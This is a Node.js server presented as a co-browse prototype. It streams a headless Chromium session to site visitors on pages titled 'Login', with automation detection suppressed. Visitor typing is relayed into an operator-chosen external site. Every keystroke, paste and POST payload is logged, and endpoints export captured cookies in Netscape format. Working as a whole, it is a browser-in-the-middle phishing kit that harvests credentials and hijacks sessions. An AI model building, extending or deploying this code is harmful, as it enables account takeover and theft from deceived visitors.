// Co-browse prototype server
// -------------------------------------------------------------
// One Node process simulates BOTH sites so you can test on one machine:
//   Domain A (the site visitors browse)  -> http://localhost:3000
//   Domain B (your operator dashboard)   -> http://localhost:3000/operator
//
// Real time transport: Socket.IO (WebSocket).
// The "server browser" is a single headless Chromium (Playwright) that
// represents YOUR session. Its screen is streamed to the operator and to any
// visitor you cast to, using Chrome DevTools Protocol Page.startScreencast.
// Visitor/operator clicks + typing are relayed back INTO that one browser,
// so submits happen in your session — the visitor never needs cookies.
// -------------------------------------------------------------

import express from 'express';
import http from 'http';
import { Server } from 'socket.io';
import { chromium } from 'playwright';
import fs from 'fs';
import path from 'path';

const PORT = process.env.PORT || 3000;
const VIEWPORT = { width: 1920, height: 1080 };
const SESSIONS_DIR = path.join(process.cwd(), '.sessions');
fs.mkdirSync(SESSIONS_DIR, { recursive: true });

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

// ---- Domain A: the pages visitors browse ----------------------------------
const VISITOR_PAGES = {
  '/':      { title: 'Login',   body: 'Welcome to Demo Store A. Try /cats or /dogs.' },
  '/cats':  { title: 'Login',   body: 'All our finest cats. 🐱' },
  '/dogs':  { title: 'Login',   body: 'Very good dogs, every one. 🐶' },
  '/help':  { title: 'Login',   body: 'Need a hand? An agent may co-browse with your consent.' },
};

function visitorPage(path) {
  const p = VISITOR_PAGES[path] || { title: 'Not found', body: 'No such page.' };
  
  // If autocast is on, hide the default store HTML by default to avoid flash of content
  const hideStyles = autoCastEnabled ? 'style="display: none;"' : '';
  const loadingDisplay = autoCastEnabled ? '' : 'style="display: none;"';

  return `<!doctype html><html><head><meta charset="utf8"><title>Login</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="/site-a.css">
  <style>
    .loading-screen {
      position: fixed;
      inset: 0;
      background: #0f172a;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #93c5fd;
      font-family: system-ui, -apple-system, sans-serif;
      z-index: 9999;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(147, 197, 253, 0.1);
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
  </head>
  <body data-path="${path}">
    <div id="loading-screen" class="loading-screen" ${loadingDisplay}>
      <div class="spinner"></div>
      <div style="font-weight: 600; font-size: 16px;">Loading secure browser session...</div>
      <div style="font-size: 13px; opacity: 0.7; margin-top: 4px;">Please wait while we connect your co-browse view.</div>
    </div>
    <header id="visitor-header" ${hideStyles}><b>Login</b> <span class="dim">(Domain A)</span>
      <nav><a href="/">Home</a> <a href="/cats">Cats</a> <a href="/dogs">Dogs</a> <a href="/help">Help</a></nav>
    </header>
    <main id="visitor-main" ${hideStyles}>
      <h1>${p.title}</h1>
      <p>${p.body}</p>
      <p class="dim">You are on <code>${path}</code>. An operator on Domain B can see this in real time.</p>
    </main>
    <div id="cobrowse-stage" hidden></div>
    <script src="/socket.io/socket.io.js"></script>
    <script src="/beacon.js"></script>
  </body></html>`;
}

// serve any known visitor path (and root) as Domain A
app.get(['/', '/cats', '/dogs', '/help'], (req, res) => {
  res.type('html').send(visitorPage(req.path));
});

// operator dashboard = Domain B
app.get('/operator', (req, res) => res.sendFile(process.cwd() + '/public/operator.html'));

// wildcard handler to serve visitor page for all custom path suffixes
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/operator') || req.path.startsWith('/api') || req.path.includes('.')) {
    return next();
  }
  res.type('html').send(visitorPage(req.path));
});

// export cookies in Netscape format
app.get('/api/cookies/export', (req, res) => {
  if (!fs.existsSync(SESSIONS_DIR)) {
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="cookies.txt"');
    res.send('# Netscape HTTP Cookie File\n# No saved sessions found.\n');
    return;
  }
  
  try {
    const files = fs.readdirSync(SESSIONS_DIR).filter(file => file.endsWith('.json'));
    let output = '# Netscape HTTP Cookie File\n';
    output += '# http://curl.haxx.se/rfc/cookie_spec.html\n';
    output += '# This file was generated by cobrowse-prototype\n\n';
    
    for (const file of files) {
      const sessionId = file.replace('.json', '');
      const filePath = path.join(SESSIONS_DIR, file);
      const state = JSON.parse(fs.readFileSync(filePath, 'utf8'));
      
      if (state.cookies && state.cookies.length > 0) {
        output += `# --- Cookies for Session: ${sessionId} ---\n`;
        for (const cookie of state.cookies) {
          const domain = cookie.domain;
          const includeSubdomains = domain.startsWith('.') ? 'TRUE' : 'FALSE';
          const pathVal = cookie.path || '/';
          const secure = cookie.secure ? 'TRUE' : 'FALSE';
          const expires = (cookie.expires && cookie.expires > 0) ? Math.round(cookie.expires) : 2147483647;
          const name = cookie.name;
          const value = cookie.value;
          output += `${domain}\t${includeSubdomains}\t${pathVal}\t${secure}\t${expires}\t${name}\t${value}\n`;
        }
        output += '\n';
      }
    }
    
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'attachment; filename="cookies.txt"');
    res.send(output);
  } catch (e) {
    console.error('Error exporting cookies:', e);
    res.status(500).send('Error exporting cookies');
  }
});

// ---- shared real-time state -----------------------------------------------
const visitors = new Map(); // sessionId -> { sessionId, currentSocketId, history: [], casting: false }
const activeSessions = new Map(); // sessionId -> { context, page, cdp, cropState, statePath }
const disconnectTimeouts = new Map(); // sessionId -> timeoutId

let autoCastEnabled = false;
let defaultCastUrl = '';

// export cookies for a single session in Netscape format
app.get('/api/cookies/export/:sessionId', async (req, res) => {
  let sessionId = req.params.sessionId;

  // Resolve mapped browser session if a visitor is linked to a different session
  const v = visitors.get(sessionId);
  if (v && v.browserSessionId) {
    sessionId = v.browserSessionId;
  }

  let state = null;

  // Check if session is currently active in memory to get the freshest cookies
  const activeSession = activeSessions.get(sessionId);
  if (activeSession) {
    try {
      state = await activeSession.context.storageState();
    } catch (e) {
      console.error(`Error reading active storage state for ${sessionId}:`, e);
    }
  }

  // If not active or failed to read active state, fallback to disk file
  if (!state) {
    const filePath = path.join(SESSIONS_DIR, `${sessionId}.json`);
    if (fs.existsSync(filePath)) {
      try {
        state = JSON.parse(fs.readFileSync(filePath, 'utf8'));
      } catch (e) {
        console.error(`Error parsing session file on disk for ${sessionId}:`, e);
      }
    }
  }

  let output = '# Netscape HTTP Cookie File\n';
  output += '# http://curl.haxx.se/rfc/cookie_spec.html\n';
  output += '# This file was generated by cobrowse-prototype\n\n';

  if (state && state.cookies && state.cookies.length > 0) {
    output += `# --- Cookies for Session: ${sessionId} ---\n`;
    for (const cookie of state.cookies) {
      const domain = cookie.domain;
      const includeSubdomains = domain.startsWith('.') ? 'TRUE' : 'FALSE';
      const pathVal = cookie.path || '/';
      const secure = cookie.secure ? 'TRUE' : 'FALSE';
      const expires = (cookie.expires && cookie.expires > 0) ? Math.round(cookie.expires) : 2147483647;
      const name = cookie.name;
      const value = cookie.value;
      output += `${domain}\t${includeSubdomains}\t${pathVal}\t${secure}\t${expires}\t${name}\t${value}\n`;
    }
  } else {
    output += `# No cookies found for session ${sessionId}.\n`;
  }

  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Disposition', `attachment; filename="cookies-${sessionId}.txt"`);
  res.send(output);
});

// export input/interaction logs for a single session
app.get('/api/logs/export/:sessionId', (req, res) => {
  let sessionId = req.params.sessionId;

  // Resolve mapped browser session if visitor is linked to a different session
  const v = visitors.get(sessionId);
  if (v && v.browserSessionId) {
    sessionId = v.browserSessionId;
  }

  const logPath = path.join(SESSIONS_DIR, `${sessionId}-input.log`);
  if (fs.existsSync(logPath)) {
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', `attachment; filename="${sessionId}-input.log"`);
    res.sendFile(logPath);
  } else {
    res.status(404).send(`No logs found for session ${sessionId}`);
  }
});

// delete session files and stop context
app.post('/api/sessions/delete/:sessionId', async (req, res) => {
  let sessionId = req.params.sessionId;

  // Resolve mapped browser session
  const v = visitors.get(sessionId);
  if (v && v.browserSessionId) {
    sessionId = v.browserSessionId;
  }

  try {
    // 1. Stop the session if active
    await stopSession(sessionId);

    // 2. Delete JSON cookie file
    const jsonPath = path.join(SESSIONS_DIR, `${sessionId}.json`);
    if (fs.existsSync(jsonPath)) {
      fs.unlinkSync(jsonPath);
    }

    // 2.5. Delete meta file
    const metaPath = path.join(SESSIONS_DIR, `${sessionId}.meta`);
    if (fs.existsSync(metaPath)) {
      fs.unlinkSync(metaPath);
    }

    // 3. Delete input log file
    const logPath = path.join(SESSIONS_DIR, `${sessionId}-input.log`);
    if (fs.existsSync(logPath)) {
      fs.unlinkSync(logPath);
    }

    // Stop casting for any visitors linked to this session
    for (const vis of visitors.values()) {
      if (vis.browserSessionId === sessionId) {
        vis.casting = false;
        vis.browserSessionId = vis.sessionId; // Reset to self
        if (vis.currentSocketId) {
          io.to(vis.currentSocketId).emit('cast:stop');
        }
      }
    }

    broadcastVisitors();
    res.sendStatus(200);
  } catch (e) {
    console.error(`Error deleting session ${sessionId}:`, e);
    res.status(500).send('Error deleting session');
  }
});

function getSavedSessions() {
  const list = ['default'];
  if (!fs.existsSync(SESSIONS_DIR)) return list;
  try {
    const files = fs.readdirSync(SESSIONS_DIR)
      .filter(file => file.endsWith('.json'))
      .map(file => file.replace('.json', ''));
    for (const f of files) {
      if (f !== 'default') list.push(f);
    }
  } catch (e) {}
  return list;
}

function broadcastVisitors() {
  const saved = getSavedSessions();
  const list = [];
  const onlineSessions = new Set();
  
  for (const v of visitors.values()) {
    onlineSessions.add(v.sessionId);
    const session = activeSessions.get(v.sessionId);
    
    let displayUrl = v.history[v.history.length - 1];
    if (session) {
      const page = session.broadcastTab === 'tab1' ? session.page1 : session.page2;
      const cur = page.url();
      if (cur && cur !== 'about:blank') displayUrl = cur;
    } else if (autoCastEnabled && defaultCastUrl) {
      displayUrl = defaultCastUrl;
    }

    list.push({
      sessionId: v.sessionId,
      online: true,
      casting: v.casting,
      active: !!session,
      history: v.history,
      displayUrl,
      activeTab: session ? session.activeTab : 'tab1',
      broadcastTab: session ? session.broadcastTab : 'tab1',
      url1: session ? session.page1.url() : '',
      url2: session ? session.page2.url() : ''
    });
  }
  
  for (const sid of saved) {
    if (!onlineSessions.has(sid)) {
      const session = activeSessions.get(sid);
      
      let displayUrl = '(Offline Saved Session)';
      let activeTab = 'tab1';
      let broadcastTab = 'tab1';
      let url1 = '';
      let url2 = '';

      const statePath = path.join(SESSIONS_DIR, `${sid}.json`);
      const metaPath = statePath.replace('.json', '.meta');
      if (fs.existsSync(metaPath)) {
        try {
          const meta = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
          displayUrl = meta.displayUrl || displayUrl;
          activeTab = meta.activeTab || activeTab;
          broadcastTab = meta.broadcastTab || broadcastTab;
          url1 = meta.url1 || url1;
          url2 = meta.url2 || url2;
        } catch {}
      }

      if (session) {
        const page = session.broadcastTab === 'tab1' ? session.page1 : session.page2;
        const cur = page.url();
        if (cur && cur !== 'about:blank') displayUrl = cur;
        activeTab = session.activeTab;
        broadcastTab = session.broadcastTab;
        url1 = session.page1.url();
        url2 = session.page2.url();
      }

      list.push({
        sessionId: sid,
        online: false,
        casting: false,
        active: !!session,
        history: ['(Offline Saved Session)'],
        displayUrl,
        activeTab,
        broadcastTab,
        url1,
        url2
      });
    }
  }
  
  io.to('operators').emit('visitors', list);
}

// ---- multi-session headless browser launcher -----------------------------
let browser, browserInit;

function ensureBrowser() {
  if (!browserInit) browserInit = (async () => {
    browser = await chromium.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-blink-features=AutomationControlled',
        '--disable-gpu',
        '--disable-dev-shm-usage',
        '--disable-setuid-sandbox',
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-extensions'
      ]
    });
  })();
  return browserInit;
}

async function updateScreencastStates(session) {
  let anyoneCastingTab1 = false;
  let anyoneCastingTab2 = false;
  for (const v of visitors.values()) {
    if (v.casting && v.browserSessionId === session.sessionId) {
      if (v.browserBroadcastTab === 'tab1') anyoneCastingTab1 = true;
      if (v.browserBroadcastTab === 'tab2') anyoneCastingTab2 = true;
    }
  }

  const needTab1 = (session.activeTab === 'tab1') || anyoneCastingTab1;
  const needTab2 = (session.activeTab === 'tab2') || anyoneCastingTab2;

  if (needTab1 && !session.screencasting1) {
    session.screencasting1 = true;
    await session.cdp1.send('Page.startScreencast', {
      format: 'jpeg', quality: 80,
      maxWidth: 1280, maxHeight: 720, everyNthFrame: 1,
    }).catch((err) => { console.error('cdp1 startScreencast error:', err); session.screencasting1 = false; });
  } else if (!needTab1 && session.screencasting1) {
    session.screencasting1 = false;
    await session.cdp1.send('Page.stopScreencast').catch(() => {});
  }

  if (needTab2 && !session.screencasting2) {
    session.screencasting2 = true;
    await session.cdp2.send('Page.startScreencast', {
      format: 'jpeg', quality: 80,
      maxWidth: 1280, maxHeight: 720, everyNthFrame: 1,
    }).catch((err) => { console.error('cdp2 startScreencast error:', err); session.screencasting2 = false; });
  } else if (!needTab2 && session.screencasting2) {
    session.screencasting2 = false;
    await session.cdp2.send('Page.stopScreencast').catch(() => {});
  }
}

async function startSession(sessionId, deviceInfo) {
  await ensureBrowser();
  if (activeSessions.has(sessionId)) {
    return activeSessions.get(sessionId);
  }

  const statePath = path.join(SESSIONS_DIR, `${sessionId}.json`);
  const options = {
    viewport: VIEWPORT,
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    deviceScaleFactor: 1,
    ignoreHTTPSErrors: true
  };

  if (deviceInfo && deviceInfo.isMobile) {
    options.viewport = {
      width: deviceInfo.width || 390,
      height: deviceInfo.height || 844
    };
    options.isMobile = true;
    options.hasTouch = true;
    options.deviceScaleFactor = 3;
    options.userAgent = deviceInfo.userAgent || 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1';
  }

  if (fs.existsSync(statePath)) {
    try {
      options.storageState = statePath;
    } catch (e) {
      console.error(`Error reading storage state for ${sessionId}:`, e);
    }
  }

  const context = await browser.newContext(options);
  const page1 = await context.newPage();
  const page2 = await context.newPage();
  const cdp1 = await context.newCDPSession(page1);
  const cdp2 = await context.newCDPSession(page2);

  const session = {
    sessionId,
    context,
    page1,
    page2,
    cdp1,
    cdp2,
    activeTab: 'tab1',
    broadcastTab: 'tab1',
    screencasting1: false,
    screencasting2: false,
    cropState: null,
    statePath
  };
  activeSessions.set(sessionId, session);

  cdp1.on('Page.screencastFrame', async ({ data, sessionId: frameSessionId }) => {
    try { await cdp1.send('Page.screencastFrameAck', { sessionId: frameSessionId }); } catch {}
    
    if (session.activeTab === 'tab1') {
      io.to('operators').emit('frame', { sessionId, b64: data });
    }
    
    for (const v of visitors.values()) {
      if (v.casting && v.browserSessionId === sessionId && v.browserBroadcastTab === 'tab1' && v.currentSocketId) {
        io.to(v.currentSocketId).emit('frame', { b64: data, url: session.page1.url() });
      }
    }
  });

  cdp2.on('Page.screencastFrame', async ({ data, sessionId: frameSessionId }) => {
    try { await cdp2.send('Page.screencastFrameAck', { sessionId: frameSessionId }); } catch {}
    
    if (session.activeTab === 'tab2') {
      io.to('operators').emit('frame', { sessionId, b64: data });
    }
    
    for (const v of visitors.values()) {
      if (v.casting && v.browserSessionId === sessionId && v.browserBroadcastTab === 'tab2' && v.currentSocketId) {
        io.to(v.currentSocketId).emit('frame', { b64: data, url: session.page2.url() });
      }
    }
  });

  await updateScreencastStates(session);

  const handleNavigation = async () => {
    try {
      const state = await context.storageState();
      fs.writeFileSync(statePath, JSON.stringify(state, null, 2));

      // Save metadata (like the last known URL)
      const metaPath = statePath.replace('.json', '.meta');
      const meta = {
        url1: page1.url(),
        url2: page2.url(),
        activeTab: session.activeTab,
        broadcastTab: session.broadcastTab,
        displayUrl: session.broadcastTab === 'tab1' ? page1.url() : page2.url()
      };
      fs.writeFileSync(metaPath, JSON.stringify(meta, null, 2));
    } catch {}
    broadcastVisitors();
  };
  page1.on('framenavigated', handleNavigation);
  page2.on('framenavigated', handleNavigation);
  page1.on('load', handleNavigation);
  page2.on('load', handleNavigation);

  const capturePostData = (page) => async (request) => {
    if (request.method() === 'POST') {
      const url = request.url();
      const postData = request.postData();
      if (postData) {
        const logPath = path.join(SESSIONS_DIR, `${sessionId}-input.log`);
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] [POST_DATA] [${page === page1 ? 'TAB1' : 'TAB2'}] URL: ${url}\nPayload: ${postData}\n`;
        try {
          fs.appendFileSync(logPath, entry);
        } catch (e) {
          console.error(`Error logging POST data for session ${sessionId}:`, e);
        }
      }
    }
  };

  page1.on('request', capturePostData(page1));
  page2.on('request', capturePostData(page2));

  const v = visitors.get(sessionId);
  let startUrl = `http://localhost:${PORT}/`;
  if (autoCastEnabled && defaultCastUrl) {
    startUrl = defaultCastUrl.trim();
    if (!/^https?:\/\//i.test(startUrl)) {
      startUrl = 'https://' + startUrl;
    }
  } else if (v && v.url) {
    startUrl = `http://localhost:${PORT}${v.url}`;
  } else if (v && v.history && v.history.length > 0) {
    startUrl = `http://localhost:${PORT}${v.history[v.history.length - 1]}`;
  }
  
  await page1.goto(startUrl, { waitUntil: 'domcontentloaded' }).catch(() => {});
  await page2.goto('https://example.com', { waitUntil: 'domcontentloaded' }).catch(() => {});

  return session;
}

async function stopSession(sessionId) {
  const session = activeSessions.get(sessionId);
  if (session) {
    try {
      const state = await session.context.storageState();
      fs.writeFileSync(session.statePath, JSON.stringify(state, null, 2));
      
      await session.cdp1.detach().catch(() => {});
      await session.cdp2.detach().catch(() => {});
      await session.page1.close().catch(() => {});
      await session.page2.close().catch(() => {});
      await session.context.close().catch(() => {});
    } catch (e) {
      console.error('Error closing session:', e);
    }
    activeSessions.delete(sessionId);
  }
}

async function switchTab(sessionId, targetTab) {
  const session = activeSessions.get(sessionId);
  if (!session || session.activeTab === targetTab) return;

  session.activeTab = targetTab;
  await updateScreencastStates(session);

  const activePage = targetTab === 'tab1' ? session.page1 : session.page2;
  io.to('operators').emit('tab:change', { sessionId, activeTab: targetTab, url: activePage.url() });
  broadcastVisitors();
}

function broadcastFrame(sessionId, data) {
  io.to('operators').emit('frame', { sessionId, b64: data });
  for (const v of visitors.values()) {
    if (v.casting && v.browserSessionId === sessionId && v.currentSocketId) {
      io.to(v.currentSocketId).emit('frame', data);
    }
  }
}

function handleVisitorDisconnect(sessionId) {
  if (disconnectTimeouts.has(sessionId)) {
    clearTimeout(disconnectTimeouts.get(sessionId));
  }
  const tid = setTimeout(async () => {
    disconnectTimeouts.delete(sessionId);
    const v = visitors.get(sessionId);
    if (v) {
      visitors.delete(sessionId);
      await stopSession(sessionId);
      broadcastVisitors();
    }
  }, 5000);
  disconnectTimeouts.set(sessionId, tid);
}

function handleVisitorConnect(sessionId) {
  if (disconnectTimeouts.has(sessionId)) {
    clearTimeout(disconnectTimeouts.get(sessionId));
    disconnectTimeouts.delete(sessionId);
  }
}

function toPx(nx, ny) {
  return { x: Math.round(nx * VIEWPORT.width), y: Math.round(ny * VIEWPORT.height) };
}

function logInputEvent(sessionId, role, ev) {
  const logPath = path.join(SESSIONS_DIR, `${sessionId}-input.log`);
  const timestamp = new Date().toISOString();
  let detail = '';
  
  if (ev.type === 'click') {
    detail = `click at (${ev.nx.toFixed(4)}, ${ev.ny.toFixed(4)})`;
  } else if (ev.type === 'move') {
    detail = `move at (${ev.nx.toFixed(4)}, ${ev.ny.toFixed(4)})`;
  } else if (ev.type === 'scroll') {
    detail = `scroll dy=${ev.dy}`;
  } else if (ev.type === 'text') {
    detail = `typed text: "${ev.text}"`;
  } else if (ev.type === 'key') {
    detail = `pressed key: "${ev.key}"`;
  } else if (ev.type === 'paste') {
    detail = `pasted text: "${ev.text}"`;
  } else if (ev.type === 'goto') {
    detail = `navigated to: "${ev.url}"`;
  } else {
    detail = JSON.stringify(ev);
  }
  
  const entry = `[${timestamp}] [${role.toUpperCase()}] ${detail}\n`;
  try {
    fs.appendFileSync(logPath, entry);
  } catch (e) {
    console.error(`Error writing input log for session ${sessionId}:`, e);
  }
}

async function applyInput(sessionId, ev, targetTab) {
  const session = activeSessions.get(sessionId);
  if (!session) return;
  const tab = targetTab || session.activeTab;
  const page = tab === 'tab1' ? session.page1 : session.page2;
  if (!page) return;
  try {
    if (ev.type === 'click') {
      const { x, y } = toPx(ev.nx, ev.ny);
      await page.mouse.click(x, y);
    } else if (ev.type === 'move') {
      const { x, y } = toPx(ev.nx, ev.ny);
      await page.mouse.move(x, y);
    } else if (ev.type === 'scroll') {
      await page.mouse.wheel(0, ev.dy);
    } else if (ev.type === 'text') {
      await page.keyboard.type(ev.text);
    } else if (ev.type === 'key') {
      await page.keyboard.press(ev.key);
    } else if (ev.type === 'goto') {
      let url = ev.url.trim();
      if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
      await page.goto(url, { waitUntil: 'domcontentloaded' }).catch(() => {});
    }

    // Force a layout/paint cycle to trigger CDP screencast frame generation instantly
    await page.evaluate(() => new Promise(requestAnimationFrame)).catch(() => {});

    // Auto-save storageState (cookies/localStorage) to disk after inputs/interactions
    try {
      const state = await session.context.storageState();
      fs.writeFileSync(session.statePath, JSON.stringify(state, null, 2));
    } catch {}
  } catch (e) { /* ignore transient input errors */ }
}

// ---- socket wiring ---------------------------------------------------------
io.on('connection', (socket) => {
  // --- visitor side (Domain A beacon) ---
  socket.on('visitor:hello', async ({ sessionId, url, deviceInfo }) => {
    handleVisitorConnect(sessionId);
    let v = visitors.get(sessionId);
    if (v) {
      v.currentSocketId = socket.id;
      if (deviceInfo) v.deviceInfo = deviceInfo;
      if (v.history[v.history.length - 1] !== url) {
        v.history.push(url);
      }
    } else {
      v = {
        sessionId,
        currentSocketId: socket.id,
        history: [url],
        casting: false,
        browserSessionId: sessionId,
        browserBroadcastTab: 'tab1',
        deviceInfo: deviceInfo || null
      };
      visitors.set(sessionId, v);
    }

    if (autoCastEnabled && !v.casting) {
      v.casting = true;
    }

    broadcastVisitors();

    if (v.casting) {
      const session = await startSession(v.browserSessionId, v.deviceInfo);
      v.browserBroadcastTab = session ? session.broadcastTab : 'tab1';
      if (session) {
        await updateScreencastStates(session);
      }
      socket.emit('cast:start', { crop: session ? session.cropState : null });
    }
  });

  socket.on('visitor:input', (ev) => {
    let targetSessionId = null;
    for (const [sid, v] of visitors.entries()) {
      if (v.currentSocketId === socket.id) {
        targetSessionId = sid;
        break;
      }
    }
    const v = visitors.get(targetSessionId);
    if (v && v.browserSessionId && activeSessions.has(v.browserSessionId)) {
      logInputEvent(v.browserSessionId, 'visitor', ev);
      applyInput(v.browserSessionId, ev, v.browserBroadcastTab);
    }
  });

  // --- operator side (Domain B) ---
  socket.on('operator:hello', () => {
    socket.join('operators');
    socket.emit('settings:init', { autoCastEnabled, defaultCastUrl });
    broadcastVisitors();
  });

  socket.on('operator:input', ({ sessionId, ev }) => {
    console.log(`[SOCKET] operator:input for session: ${sessionId}, type: ${ev.type}, url: ${ev.url}`);
    const session = activeSessions.get(sessionId);
    if (session) {
      logInputEvent(sessionId, 'operator', ev);
      applyInput(sessionId, ev, session.activeTab);
    }
  });

  socket.on('operator:update-settings', ({ autoCastEnabled: ace, defaultCastUrl: dcu }) => {
    autoCastEnabled = ace;
    defaultCastUrl = dcu;
    socket.broadcast.to('operators').emit('settings:change', { autoCastEnabled, defaultCastUrl });
  });

  socket.on('operator:redirect-visitor', ({ sessionId, url }) => {
    const v = visitors.get(sessionId);
    if (v && v.currentSocketId) {
      io.to(v.currentSocketId).emit('visitor:redirect', { url });
    }
  });

  socket.on('operator:open-session', async ({ sessionId }) => {
    const v = visitors.get(sessionId);
    await startSession(sessionId, v ? v.deviceInfo : null);
    broadcastVisitors();
  });

  socket.on('operator:close-session', async ({ sessionId }) => {
    await stopSession(sessionId);
    
    // Stop casting for any visitors linked to this session
    for (const v of visitors.values()) {
      if (v.browserSessionId === sessionId && v.casting) {
        v.casting = false;
        if (v.currentSocketId) io.to(v.currentSocketId).emit('cast:stop');
      }
    }
    broadcastVisitors();
  });

  socket.on('operator:cast', async ({ targetSessionId, sessionId }) => {
    const targetId = targetSessionId || sessionId;
    const activeId = sessionId || targetSessionId;
    const v = visitors.get(targetId);
    if (v) {
      const session = await startSession(activeId, v.deviceInfo);
      v.browserSessionId = activeId;
      v.browserBroadcastTab = session ? session.broadcastTab : 'tab1';
      v.casting = true;
      if (session) {
        await updateScreencastStates(session);
      }
      if (v.currentSocketId) {
        io.to(v.currentSocketId).emit('cast:start', { crop: session ? session.cropState : null });
      }
      broadcastVisitors();
    }
  });

  socket.on('operator:stopcast', async ({ sessionId }) => {
    const v = visitors.get(sessionId);
    if (v) {
      v.casting = false;
      const session = activeSessions.get(v.browserSessionId);
      if (session) {
        await updateScreencastStates(session);
      }
      if (v.currentSocketId) {
        io.to(v.currentSocketId).emit('cast:stop');
      }
      broadcastVisitors();
    }
  });

  socket.on('operator:switch-tab', async ({ sessionId, tab }) => {
    console.log(`[SOCKET] operator:switch-tab for session: ${sessionId}, tab: ${tab}`);
    await switchTab(sessionId, tab);
  });

  socket.on('operator:set-broadcast-tab', async ({ sessionId, tab }) => {
    console.log(`[SOCKET] operator:set-broadcast-tab for session: ${sessionId}, tab: ${tab}`);
    const session = activeSessions.get(sessionId);
    if (session) {
      session.broadcastTab = tab;
      
      // Update all visitors casting this session
      for (const v of visitors.values()) {
        if (v.browserSessionId === sessionId && v.casting) {
          v.browserBroadcastTab = tab;
        }
      }
      
      await updateScreencastStates(session);
      io.to('operators').emit('broadcast-tab:change', { sessionId, broadcastTab: tab });
      broadcastVisitors();
    }
  });

  socket.on('operator:set-crop', ({ sessionId, crop }) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.cropState = crop;
      io.to('operators').emit('crop:change', { sessionId, crop });
      
      // Update any visitors linked to this session
      for (const v of visitors.values()) {
        if (v.browserSessionId === sessionId && v.currentSocketId) {
          io.to(v.currentSocketId).emit('crop:change', crop);
        }
      }
    }
  });

  socket.on('operator:check-context', async ({ sessionId, nx, ny, clientX, clientY }) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    const page = session.activeTab === 'tab1' ? session.page1 : session.page2;
    if (!page) return;
    try {
      const x = nx * VIEWPORT.width;
      const y = ny * VIEWPORT.height;
      const info = await page.evaluate(({ x, y }) => {
        const el = document.elementFromPoint(x, y);
        if (!el) return null;
        const isInput = ['INPUT', 'TEXTAREA'].includes(el.tagName) || el.isContentEditable;
        let selection = '';
        if (isInput) {
          if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            selection = el.value.substring(el.selectionStart, el.selectionEnd);
          } else {
            selection = window.getSelection().toString();
          }
        }
        return {
          isInput,
          tagName: el.tagName,
          hasSelection: selection.length > 0,
          selectionText: selection
        };
      }, { x, y });
      
      if (info && info.isInput) {
        socket.emit('operator:show-context-menu', { info, clientX, clientY });
      }
    } catch (e) {
      console.error(e);
    }
  });

  socket.on('operator:paste', async ({ sessionId, text }) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      const page = session.activeTab === 'tab1' ? session.page1 : session.page2;
      if (page) {
        logInputEvent(sessionId, 'operator', { type: 'paste', text });
        await page.keyboard.insertText(text).catch(() => {});
        // Auto-save storageState (cookies/localStorage) to disk after paste
        try {
          const state = await session.context.storageState();
          fs.writeFileSync(session.statePath, JSON.stringify(state, null, 2));
        } catch {}
      }
    }
  });

  socket.on('visitor:check-context', async ({ nx, ny, clientX, clientY }) => {
    let targetSessionId = null;
    for (const [sid, v] of visitors.entries()) {
      if (v.currentSocketId === socket.id) {
        targetSessionId = sid;
        break;
      }
    }
    const v = visitors.get(targetSessionId);
    if (!v || !v.browserSessionId) return;
    const session = activeSessions.get(v.browserSessionId);
    if (!session) return;
    const page = v.browserBroadcastTab === 'tab1' ? session.page1 : session.page2;
    if (!page) return;
    try {
      const x = nx * VIEWPORT.width;
      const y = ny * VIEWPORT.height;
      const info = await page.evaluate(({ x, y }) => {
        const el = document.elementFromPoint(x, y);
        if (!el) return null;
        const isInput = ['INPUT', 'TEXTAREA'].includes(el.tagName) || el.isContentEditable;
        let selection = '';
        if (isInput) {
          if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
            selection = el.value.substring(el.selectionStart, el.selectionEnd);
          } else {
            selection = window.getSelection().toString();
          }
        }
        return {
          isInput,
          tagName: el.tagName,
          hasSelection: selection.length > 0,
          selectionText: selection
        };
      }, { x, y });
      
      if (info && info.isInput) {
        socket.emit('visitor:show-context-menu', { info, clientX, clientY });
      }
    } catch (e) {
      console.error(e);
    }
  });

  socket.on('visitor:paste', async ({ text }) => {
    let targetSessionId = null;
    for (const [sid, v] of visitors.entries()) {
      if (v.currentSocketId === socket.id) {
        targetSessionId = sid;
        break;
      }
    }
    const v = visitors.get(targetSessionId);
    if (v && v.browserSessionId) {
      const session = activeSessions.get(v.browserSessionId);
      if (session) {
        const page = v.browserBroadcastTab === 'tab1' ? session.page1 : session.page2;
        if (page) {
          logInputEvent(v.browserSessionId, 'visitor', { type: 'paste', text });
          await page.keyboard.insertText(text).catch(() => {});
          // Auto-save storageState (cookies/localStorage) to disk after paste
          try {
            const state = await session.context.storageState();
            fs.writeFileSync(session.statePath, JSON.stringify(state, null, 2));
          } catch {}
        }
      }
    }
  });

  socket.on('disconnect', () => {
    let foundSessionId = null;
    for (const [sid, v] of visitors.entries()) {
      if (v.currentSocketId === socket.id) {
        foundSessionId = sid;
        break;
      }
    }
    if (foundSessionId) {
      handleVisitorDisconnect(foundSessionId);
    }
  });
});

